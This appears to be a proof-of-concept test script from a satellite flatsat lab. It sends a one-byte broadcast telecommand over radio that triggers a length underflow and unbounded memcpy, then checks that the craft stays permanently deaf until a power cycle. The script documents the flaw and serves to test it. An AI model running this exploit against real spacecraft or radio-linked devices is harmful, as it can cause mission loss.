#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


def _ping(dev):
    try:
        return dev.tc(0x01, b"", via="radio")
    except Exception:
        return []                       # wedged silicon: writes NAK, no TM


def _dead(dev, tries=4, gap=2.0):
    """Crash indicator that works on both targets: the simulator reports
    CRASHED instantly; on hardware the runaway memcpy corrupts the mission
    core, after which the LAB_STATUS bench channel stops answering."""
    import time
    for _ in range(tries):
        if not dev.probe_alive():
            return True
        time.sleep(gap)
    return not dev.probe_alive()


def main(dev, ev):
    # V0-03: BROADCAST_MSG with a 1-byte payload -> msg_len = 1-2 underflows
    # to 0xFFFD -> unbounded memcpy overruns the receive buffer. On the
    # simulator this is a HardFault (CRASHED); on silicon the wild copy
    # wrecks the mission context and the craft goes permanently deaf --
    # no watchdog was ever armed (mission loss until a power cycle).
    tms = dev.tc(0x06, b"\x07", via="radio")     # 1-byte payload
    ev.log(f"response frames: {tms}")
    check(not dev.find(tms, 0x06), "device must not ACK the malformed broadcast")
    check(_dead(dev), "device should be crashed (sim) / permanently deaf (usb)")
    tms = _ping(dev)                             # PING afterwards
    check(not dev.find(tms, 0x01), "crashed device must be silent")
    dev.advance(60000)
    tms = _ping(dev)
    check(not dev.find(tms, 0x01), "still silent after 60 s -- no watchdog recovery")
    dev.powercycle()
    tms = _ping(dev)
    check(dev.find(tms, 0x01), "only a power cycle restores the craft")
    ev.log("recovered after power cycle")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-03 BROADCAST underflow -> permanent crash", main))
